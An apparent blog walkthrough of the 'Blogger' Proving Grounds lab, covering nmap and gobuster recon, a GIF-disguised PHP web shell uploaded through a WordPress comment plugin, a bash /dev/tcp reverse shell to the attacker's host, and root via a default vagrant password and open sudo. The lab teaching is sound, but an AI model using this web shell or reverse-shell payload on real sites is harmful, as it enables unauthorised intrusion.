<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>geobour98</title><meta name=keywords content><meta name=description content="ðŸ“† 24/09/2022 - geobour98 âŒš 6 min
Introduction This is a Proving Grounds room which can be found at: Blogger
The Blog of War
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 192.168.81.217  geobour98@kali:~$ nmap -p- -T4 -v 192.168.81.217 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 21:53 EEST Initiating Ping Scan at 21:53 Scanning 192.168.81.217 [2 ports] Completed Ping Scan at 21:53, 0."><meta name=author content><link rel=canonical href=https://geobour98.com/write-ups/pg/blogger/><meta name=google-site-verification content="G-VH8LGJGC27"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style><link rel=preload href=logo.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://geobour98.com/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://geobour98.com/favicon/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://geobour98.com/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://geobour98.com/favicon/apple-touch-icon.png><link rel=mask-icon href=https://geobour98.com/logo.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-VH8LGJGC27"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-VH8LGJGC27",{anonymize_ip:!1})}</script><meta property="og:title" content="Proving Grounds - Blogger"><meta property="og:description" content="ðŸ“† 24/09/2022 - geobour98 âŒš 6 min
Introduction This is a Proving Grounds room which can be found at: Blogger
The Blog of War
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 192.168.81.217  geobour98@kali:~$ nmap -p- -T4 -v 192.168.81.217 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 21:53 EEST Initiating Ping Scan at 21:53 Scanning 192.168.81.217 [2 ports] Completed Ping Scan at 21:53, 0."><meta property="og:type" content="article"><meta property="og:url" content="https://geobour98.com/write-ups/pg/blogger/"><meta property="og:image" content="https://geobour98.com/47"><meta property="article:section" content="write-ups"><meta property="og:site_name" content="geobour98"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://geobour98.com/47"><meta name=twitter:title content="Proving Grounds - Blogger"><meta name=twitter:description content="ðŸ“† 24/09/2022 - geobour98 âŒš 6 min
Introduction This is a Proving Grounds room which can be found at: Blogger
The Blog of War
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 192.168.81.217  geobour98@kali:~$ nmap -p- -T4 -v 192.168.81.217 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 21:53 EEST Initiating Ping Scan at 21:53 Scanning 192.168.81.217 [2 ports] Completed Ping Scan at 21:53, 0."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://geobour98.com/write-ups/"},{"@type":"ListItem","position":2,"name":"Proving Grounds - Blogger","item":"https://geobour98.com/write-ups/pg/blogger/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Proving Grounds - Blogger","name":"Proving Grounds - Blogger","description":"ðŸ“† 24/09/2022 - geobour98 âŒš 6 min\nIntroduction This is a Proving Grounds room which can be found at: Blogger\nThe Blog of War\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 192.168.81.217  geobour98@kali:~$ nmap -p- -T4 -v 192.168.81.217 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 21:53 EEST Initiating Ping Scan at 21:53 Scanning 192.168.81.217 [2 ports] Completed Ping Scan at 21:53, 0.","keywords":[],"articleBody":"ðŸ“† 24/09/2022 - geobour98 âŒš 6 min\nIntroduction This is a Proving Grounds room which can be found at: Blogger\nThe Blog of War\nReconnaissance \u0026 Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 192.168.81.217  geobour98@kali:~$ nmap -p- -T4 -v 192.168.81.217 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 21:53 EEST Initiating Ping Scan at 21:53 Scanning 192.168.81.217 [2 ports] Completed Ping Scan at 21:53, 0.05s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 21:53 Completed Parallel DNS resolution of 1 host. at 21:53, 0.00s elapsed Initiating Connect Scan at 21:53 Scanning 192.168.81.217 (192.168.81.217) [65535 ports] Discovered open port 80/tcp on 192.168.81.217 Discovered open port 22/tcp on 192.168.81.217 Completed Connect Scan at 21:53, 16.72s elapsed (65535 total ports) Nmap scan report for 192.168.81.217 (192.168.81.217) Host is up (0.053s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports.\n  Command: sudo nmap -A -sC -p 22,80 -v 192.168.81.217  geobour98@kali:~$ sudo nmap -A -sC -p 22,80 -v 192.168.81.217 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 21:53 EEST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 21:53 Completed NSE at 21:53, 0.00s elapsed Initiating NSE at 21:53 Completed NSE at 21:53, 0.00s elapsed Initiating NSE at 21:53 Completed NSE at 21:53, 0.00s elapsed Initiating Ping Scan at 21:53 Scanning 192.168.81.217 [4 ports] Completed Ping Scan at 21:53, 0.09s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 21:53 Completed Parallel DNS resolution of 1 host. at 21:53, 0.00s elapsed Initiating SYN Stealth Scan at 21:53 Scanning 192.168.81.217 (192.168.81.217) [2 ports] Discovered open port 22/tcp on 192.168.81.217 Discovered open port 80/tcp on 192.168.81.217 Completed SYN Stealth Scan at 21:53, 0.10s elapsed (2 total ports) Initiating Service scan at 21:53 Scanning 2 services on 192.168.81.217 (192.168.81.217) Completed Service scan at 21:54, 6.12s elapsed (2 services on 1 host) Initiating OS detection (try #1) against 192.168.81.217 (192.168.81.217) Retrying OS detection (try #2) against 192.168.81.217 (192.168.81.217) Initiating Traceroute at 21:54 Completed Traceroute at 21:54, 0.06s elapsed Initiating Parallel DNS resolution of 1 host. at 21:54 Completed Parallel DNS resolution of 1 host. at 21:54, 0.00s elapsed NSE: Script scanning 192.168.81.217. Initiating NSE at 21:54 Completed NSE at 21:54, 6.78s elapsed Initiating NSE at 21:54 Completed NSE at 21:54, 0.22s elapsed Initiating NSE at 21:54 Completed NSE at 21:54, 0.00s elapsed Nmap scan report for 192.168.81.217 (192.168.81.217) Host is up (0.054s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 95:1d:82:8f:5eðŸ‡©ðŸ‡ª9a:00:a8:07:39:bd:ac:ad:d3:44 (RSA) | 256 d7:b4:52:a2:c8:fa:b7:0e:d1:a8:d0:70:cd:6b:36:90 (ECDSA) |_ 256 df:f2:4f:77:33:44:d5:93:d7:79:17:45:5a:a1:36:8b (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Blogger | Home | http-methods: |_ Supported Methods: HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.2.0 (95%), Linux 3.11 - 4.1 (94%), Linux 4.4 (94%), Linux 3.16 (93%), Linux 3.13 (92%), Linux 3.10 - 3.16 (91%), Linux 3.10 - 3.12 (90%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 or 4.2 (90%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 0.006 days (since Mon Sep 19 21:46:10 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=259 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 55.69 ms 192.168.49.1 (192.168.49.1) 2 52.86 ms 192.168.81.217 (192.168.81.217)  NSE: Script Post-scanning. Initiating NSE at 21:54 Completed NSE at 21:54, 0.00s elapsed Initiating NSE at 21:54 Completed NSE at 21:54, 0.00s elapsed Initiating NSE at 21:54 Completed NSE at 21:54, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.70 seconds  Raw packets sent: 78 (5.316KB) | Rcvd: 42 (16.692KB) Brute force the website for directories using gobuster.\n  Command: gobuster dir -u http://192.168.81.217/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50  geobour98@kali:~$ gobuster dir -u http://192.168.81.217/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.81.217/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/09/19 21:56:47 Starting gobuster in directory enumeration mode =============================================================== /assets (Status: 301) [Size: 317] [-- http://192.168.81.217/assets/] /css (Status: 301) [Size: 314] [-- http://192.168.81.217/css/] /images (Status: 301) [Size: 317] [-- http://192.168.81.217/images/] /js (Status: 301) [Size: 313] [-- http://192.168.81.217/js/] /server-status (Status: 403) [Size: 279]  =============================================================== 2022/09/19 22:00:56 Finished =============================================================== The navigation on port 80 and /assets directory leads to the URL: http://192.168.81.217/assets/fonts/blog/ which appears to be a blog not displaying correctly. After hovering over most links, they lead to blogger.thm so in order for the blog to be displayed correctly we need to add the domain name and the IP address in /etc/hosts file. Then, the operating system will translate the hostname blogger.thm to the IP 192.168.81.217. The contents of /etc/hosts should look like this:\ngeobour98@kali:~$ cat /etc/hosts [REDACTED] 192.168.81.217 blogger.thm [REDACTED] Exploitation Now, navigate to http://blogger.thm/assets/fonts/blog/ and the blog is displayed correctly. It appears to be a Wordpress blog, so we could use the wpscan tool to enumerate for all plugins, all themes, config backups and Db exports, but no interesting results are shown.\n  Command: wpscan --url http://blogger.thm/assets/fonts/blog/ -e ap,at,cb,dbe  If we navigate to whichever post, we identify Comment functionality that can include the attachment of an image. Create cmd.php with contents:\nGIF87a php system($_REQUEST['cmd']); ?Above the php code we have put the magic bytes of a GIF file according to: https://en.wikipedia.org/wiki/List_of_file_signatures, in order for our file to be treated as a GIF file. Then, we attach the cmd.php, open Burp Suite, turn Intercept to On, and click on POST COMMENT. Finally, click Forward on Burp Suite. The request should look like this:\nPOST /assets/fonts/blog/wp-admin/admin-ajax.php HTTP/1.1 Host: blogger.thm User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=---------------------------5658711851211151532350158244 Content-Length: 1421 Origin: http://blogger.thm Connection: close Referer: http://blogger.thm/assets/fonts/blog/?p=29 Cookie: wpdiscuz_hide_bubble_hint=1  -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\"action\"  wpdAddComment -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\"wc_comment\"  test -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\"wmu_files[]\"  C:\\fakepath\\cmd.php -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\"wmu_attachments\"  {\"images\":[34]} -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\"wc_name\"  test -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\"wc_email\"  test@test.com -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\"wc_website\"  https://test.com -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\"submit\"  Post Comment -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\"wpdiscuz_unique_id\"  0_0 -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\"wpd_comment_depth\"  1 -----------------------------5658711851211151532350158244 Content-Disposition: form-data; name=\"postId\"  29 -----------------------------5658711851211151532350158244-- The file cmd.php is successfully uploaded and in the Comments section we can a link for cmd.php which leads to: http://blogger.thm/assets/fonts/blog/wp-content/uploads/2022/09/cmd-1663615798.9082.php. At this point, we can execute code by navigating to: http://blogger.thm/assets/fonts/blog/wp-content/uploads/2022/09/cmd-1663615798.9082.php?cmd=id Output:\nGIF87a uid=33(www-data) gid=33(www-data) groups=33(www-data) We are the user www-data, so now we want to get a reverse shell. Intercept this request: http://blogger.thm/assets/fonts/blog/wp-content/uploads/2022/09/cmd-1663615798.9082.php?cmd=id with Burp Suite, change it as shown below, click on Forward and open a netcat listener.\nGET /assets/fonts/blog/wp-content/uploads/2022/09/cmd-1663615798.9082.php?cmd=bash+-c+'exec+bash+-i+%26/dev/tcp/192.168.49.81/443+ HTTP/1.1 Host: blogger.thm User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: wpdiscuz_hide_bubble_hint=1; comment_author_email_f401df2453a4515e2d6a824db178db1a=test@test.com; comment_author_f401df2453a4515e2d6a824db178db1a=test; comment_author_url_f401df2453a4515e2d6a824db178db1a=https://test.com Upgrade-Insecure-Requests: 1 Now we have a reverse shell as the www-data user.\ngeobour98@kali:~$ nc -lvnp 443 listening on [any] 443 ... connect to [192.168.49.81] from (UNKNOWN) [192.168.81.217] 54292 bash: cannot set terminal process group (1428): Inappropriate ioctl for device bash: no job control in this shell 'import pty;pty.spawn(\"/bin/bash\")' 'import pty;pty.spawn(\"/bin/bash\")' zsh: suspended nc -lvnp 443  geobour98@kali:~$ stty raw -echo;fg [1] + continued nc -lvnp 443 =xterm-256color www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog/wp-content/uploads/2022/09$ stty rows 38 cols 111 www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog/wp-content/uploads/2022/09$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Navigate to /home and we see home folders of the users: james, ubuntu and vagrant. Vagrant is an open-source tool that allows you to create, configure, and manage boxes of virtual machines through an easy to use command interface. There is also a default password: vagrant for root on the Vagrant tool. We can try that password for the vagrant user.\nwww-data@ubuntu-xenial:/home/vagrant$ su vagrant Password: vagrant@ubuntu-xenial:~$ id uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant) Now we are the user vagrant and can read the local.txt from /home/james/ directory.\nvagrant@ubuntu-xenial:/home/james$ cat local.txt [REDACTED] Privilege Escalation After executing the command: sudo -l we see that we can execute anything as root.\nvagrant@ubuntu-xenial:/home/james$ sudo -l Matching Defaults entries for vagrant on ubuntu-xenial:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User vagrant may run the following commands on ubuntu-xenial:  (ALL) NOPASSWD: ALL vagrant@ubuntu-xenial:/home/james$ sudo -s root@ubuntu-xenial:/home/james# id uid=0(root) gid=0(root) groups=0(root) root@ubuntu-xenial:/home/james# cd /root root@ubuntu-xenial:/root# cat proof.txt [REDACTED] Proof of Concept (PoC image): ","wordCount":"1439","inLanguage":"en","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://geobour98.com/write-ups/pg/blogger/"},"publisher":{"@type":"Organization","name":"geobour98","logo":{"@type":"ImageObject","url":"https://geobour98.com/favicon/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://geobour98.com/ accesskey=h title="geobour98 (Alt + H)"><img src=https://geobour98.com/logo.png alt=logo aria-label=logo height=35>geobour98</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://geobour98.com/about/ title=About><span>About</span></a></li><li><a href=https://geobour98.com/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://geobour98.com/write-ups/ title=Write-ups><span>Write-ups</span></a></li><li><a href=https://geobour98.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>Proving Grounds - Blogger</h1><div class=post-meta></div></header><div class=post-content><p>ðŸ“† 24/09/2022 - geobour98<br>âŒš 6 min</p><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>This is a <strong>Proving Grounds</strong> room which can be found at:
<a href=https://portal.offensive-security.com/labs/play target=_blank style=color:#e30f0f>Blogger</a></p><p>The Blog of War</p><h2 id=reconnaissance--scanning>Reconnaissance & Scanning<a hidden class=anchor aria-hidden=true href=#reconnaissance--scanning>#</a></h2><p>Perform <code>nmap</code> scan to identify open ports and services.</p><ul><li>Command: <code>nmap -p- -T4 -v 192.168.81.217</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nmap -p- -T4 -v 192.168.81.217
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-09-19 21:53 EEST
</span></span><span style=display:flex><span>Initiating Ping Scan at 21:53
</span></span><span style=display:flex><span>Scanning 192.168.81.217 <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Completed Ping Scan at 21:53, 0.05s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 21:53
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 21:53, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating Connect Scan at 21:53
</span></span><span style=display:flex><span>Scanning 192.168.81.217 <span style=color:#f92672>(</span>192.168.81.217<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>65535</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Discovered open port 80/tcp on 192.168.81.217
</span></span><span style=display:flex><span>Discovered open port 22/tcp on 192.168.81.217
</span></span><span style=display:flex><span>Completed Connect Scan at 21:53, 16.72s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>65535</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 192.168.81.217 <span style=color:#f92672>(</span>192.168.81.217<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.053s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65533</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 16.83 seconds
</span></span></code></pre></div><p>Perform aggressive <code>nmap</code> scan to enable OS detection, default scripts and version detection on the found ports.</p><ul><li>Command: <code>sudo nmap -A -sC -p 22,80 -v 192.168.81.217</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ sudo nmap -A -sC -p 22,80 -v 192.168.81.217
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-09-19 21:53 EEST
</span></span><span style=display:flex><span>NSE: Loaded <span style=color:#ae81ff>155</span> scripts <span style=color:#66d9ef>for</span> scanning.
</span></span><span style=display:flex><span>NSE: Script Pre-scanning.
</span></span><span style=display:flex><span>Initiating NSE at 21:53
</span></span><span style=display:flex><span>Completed NSE at 21:53, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 21:53
</span></span><span style=display:flex><span>Completed NSE at 21:53, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 21:53
</span></span><span style=display:flex><span>Completed NSE at 21:53, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating Ping Scan at 21:53
</span></span><span style=display:flex><span>Scanning 192.168.81.217 <span style=color:#f92672>[</span><span style=color:#ae81ff>4</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Completed Ping Scan at 21:53, 0.09s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 21:53
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 21:53, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating SYN Stealth Scan at 21:53
</span></span><span style=display:flex><span>Scanning 192.168.81.217 <span style=color:#f92672>(</span>192.168.81.217<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Discovered open port 22/tcp on 192.168.81.217
</span></span><span style=display:flex><span>Discovered open port 80/tcp on 192.168.81.217
</span></span><span style=display:flex><span>Completed SYN Stealth Scan at 21:53, 0.10s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Service scan at 21:53
</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>2</span> services on 192.168.81.217 <span style=color:#f92672>(</span>192.168.81.217<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Completed Service scan at 21:54, 6.12s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> services on <span style=color:#ae81ff>1</span> host<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#1) against 192.168.81.217 (192.168.81.217)</span>
</span></span><span style=display:flex><span>Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#2) against 192.168.81.217 (192.168.81.217)</span>
</span></span><span style=display:flex><span>Initiating Traceroute at 21:54
</span></span><span style=display:flex><span>Completed Traceroute at 21:54, 0.06s elapsed
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 21:54
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 21:54, 0.00s elapsed
</span></span><span style=display:flex><span>NSE: Script scanning 192.168.81.217.
</span></span><span style=display:flex><span>Initiating NSE at 21:54
</span></span><span style=display:flex><span>Completed NSE at 21:54, 6.78s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 21:54
</span></span><span style=display:flex><span>Completed NSE at 21:54, 0.22s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 21:54
</span></span><span style=display:flex><span>Completed NSE at 21:54, 0.00s elapsed
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 192.168.81.217 <span style=color:#f92672>(</span>192.168.81.217<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.054s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 95:1d:82:8f:5eðŸ‡©ðŸ‡ª9a:00:a8:07:39:bd:ac:ad:d3:44 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> d7:b4:52:a2:c8:fa:b7:0e:d1:a8:d0:70:cd:6b:36:90 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> df:f2:4f:77:33:44:d5:93:d7:79:17:45:5a:a1:36:8b <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.18 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-title: Blogger | Home
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Supported Methods: HEAD POST OPTIONS
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.18 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Warning: OSScan results may be unreliable because we could not find at least <span style=color:#ae81ff>1</span> open and <span style=color:#ae81ff>1</span> closed port
</span></span><span style=display:flex><span>Aggressive OS guesses: Linux 3.2.0 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, Linux 3.11 - 4.1 <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, Linux 4.4 <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, Linux 3.16 <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>, Linux 3.13 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.10 - 3.16 <span style=color:#f92672>(</span>91%<span style=color:#f92672>)</span>, Linux 3.10 - 3.12 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>, Linux 3.10 - 4.11 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>, Linux 3.12 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>, Linux 3.13 or 4.2 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>test conditions non-ideal<span style=color:#f92672>)</span>.
